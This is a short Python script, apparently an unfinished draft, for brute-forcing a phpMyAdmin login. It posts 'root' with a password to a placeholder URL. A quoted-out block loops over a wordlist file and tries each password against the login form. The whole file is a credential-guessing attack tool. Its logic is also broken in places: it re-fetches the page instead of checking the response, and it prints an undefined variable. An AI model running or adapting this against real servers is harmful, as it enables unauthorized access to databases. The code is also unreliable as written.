import requests

url = "http://<url>/phpmyadmin/"
user = 'root'
password = '1'
#a = True
#while (a != False):

#payload = haslo ze slownika
data = {'pma_username': user, 'pma_password': password}

req = requests.post(url, data)

print(req.text)
   # if "Access denied for user" in req.text:

# !/usr/bin/python
# -*-coding: utf8 -*-

'''
import requests

url = "http://<url>/phpmyadmin/index.php"
wordlist = open('wordlist.txt', 'r').readlines()

for line in wordlist:
    password = line.strip()
    http = requests.post(url, data={"pma_username":'root', "pma_password":password, 'submit': 'submit'})

    content = http.content
    if "Incorrect pass or login" in str(requests.get(url).content):
        print("login to: ", login)
'''